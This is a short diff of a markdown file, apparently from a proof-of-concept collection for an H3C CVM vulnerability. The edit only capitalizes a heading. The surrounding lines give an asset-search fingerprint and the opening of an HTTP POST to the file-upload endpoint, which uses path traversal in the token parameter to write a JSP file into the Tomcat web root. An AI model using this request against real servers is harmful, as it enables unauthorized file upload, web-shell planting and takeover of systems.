@@ -8,7 +8,7 @@
 app="H3C-CVM"
 ```
 
-## poc
+## POC
 
 ```
 POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1
